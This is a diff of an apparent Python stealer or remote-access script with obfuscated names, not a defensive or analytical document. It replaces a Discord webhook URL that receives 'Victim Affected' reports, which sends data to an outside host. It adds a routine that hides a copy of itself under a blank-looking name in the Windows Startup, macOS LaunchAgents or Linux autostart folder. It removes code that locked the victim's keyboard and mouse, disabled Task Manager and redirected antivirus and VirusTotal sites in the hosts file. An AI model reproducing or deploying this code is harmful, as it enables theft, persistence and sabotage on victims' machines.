@@ -1,4 +1,4 @@
-w3bh00k_ur1 = "https://discord.com/api/webhooks/1267081979661127796/GrIdRf0pz0cOms3BGgvX4WIgDw_gX9BwtXs35rSF9_5VgHx8Z3mDSHqg79MmwA4q1qMe"
+w3bh00k_ur1 = "https://discord.com/api/webhooks/1267217196082401403/NCcuyRVFrK4YSpZA9H-RBPHdnrElThyPXrSWQC7AKaogJDMna2H6UQ4f8Gu5PNe0JtrS"
 while True:
     import os
     try:
@@ -1178,123 +1178,29 @@ def Scr33n5h0t():
     except:
         pass
 
-def B10ck_K3y():
-    k3y = [
-        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
-        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
-        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
-        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
-        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
-        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
-        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
-        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
-        "backslash", "semicolon", "comma", "period", "slash",
-        "volume up", "volume down", "volume mute",
-        "app", "sleep", "print screen", "pause",
-    ]
-    for k3y_b10ck in k3y:
-        try: keyboard.block_key(k3y_b10ck)
-        except: pass
-
-def Unb10ck_K3y():
-    k3y = [
-        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
-        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
-        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
-        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
-        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
-        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
-        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
-        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
-        "backslash", "semicolon", "comma", "period", "slash",
-        "volume up", "volume down", "volume mute",
-        "app", "sleep", "print screen", "pause",
-    ]
-    for k3y_b10ck in k3y:
-        try: keyboard.unblock_key(k3y_b10ck)
-        except: pass
-
-def B10ck_M0u53():
-    pyautogui.FAILSAFE = False
-    width, height = pyautogui.size()
-    pyautogui.moveTo(width + 100, height + 100)
-
-    while True:
-        try:
-            B10ck_M0u53()
-            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
-                Unb10ck_K3y()
-                break
-        except:
-            pass
-
-def B10ck_T45k_M4n4g3r():
-    "Perm Admin Required"
-    for proc in psutil.process_iter(['pid', 'name']):
-        if proc.info['name'] == 'Taskmgr.exe':
-            proc.terminate()
-            break
-    subprocess.run("reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
-    Clear()
-
-def B10ck_W3b5it3():
-    "Perm Admin Required"
+def St4rtup():
     try:
-        d1r3ct0ry = os.getcwd()
-        d15k_l3tt3r = os.path.splitdrive(d1r3ct0ry)[0]
+        file_path = os.path.abspath(sys.argv[0])
 
-        def b10ck_w3b5it3(website):
-            hosts_path = f"{d15k_l3tt3r}\\Windows\\System32\\drivers\\etc\\hosts"
-            if os.path.exists(hosts_path):
-                pass
-            else:
-                hosts_path = f"C:\\Windows\\System32\\drivers\\etc\\hosts"
+        if file_path.endswith(".exe"):
+            ext = "exe"
+        elif file_path.endswith(".py"):
+            ext = "py"
 
-            redirect = "127.0.0.1"
-            with open(hosts_path, "a") as file:
-                file.write("\n" + redirect + " " + website)
-        
-        w3b51t35_t0_8l0ck = [
-            'virustotal.com', 
-            'www.virustotal.com',
-            'www.virustotal.com/gui/home/upload',
-            'avast.com', 
-            'totalav.com', 
-            'scanguard.com', 
-            'totaladblock.com', 
-            'pcprotect.com', 
-            'mcafee.com', 
-            'bitdefender.com', 
-            'us.norton.com', 
-            'avg.com', 
-            'malwarebytes.com', 
-            'pandasecurity.com', 
-            'avira.com', 
-            'norton.com', 
-            'eset.com', 
-            'zillya.com', 
-            'kaspersky.com', 
-            'usa.kaspersky.com', 
-            'sophos.com', 
-            'home.sophos.com', 
-            'adaware.com', 
-            'bullguard.com', 
-            'clamav.net', 
-            'drweb.com', 
-            'emsisoft.com', 
-            'f-secure.com', 
-            'zonealarm.com', 
-            'trendmicro.com', 
-            'ccleaner.com'
-        ]
+        new_name = f"ㅤ.{ext}"
 
-        for w3b51t3 in w3b51t35_t0_8l0ck:
-            b10ck_w3b5it3(w3b51t3)
+        if sys.platform.startswith('win'):  
+            folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        elif sys.platform.startswith('darwin'): 
+            folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
+        elif sys.platform.startswith('linux'):
+            folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
+        path_new_file = os.path.join(folder, new_name)
+
+        shutil.copy(file_path, path_new_file)
+        os.chmod(path_new_file, 0o777) 
     except:
         pass
-
-def F4k3_3rr0r():
-    messagebox.showerror("je tai bz desoler fils", "ezzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
 
 payload = {
     'content': f'****╔═════════════════Victim Affected═════════════════╗****',
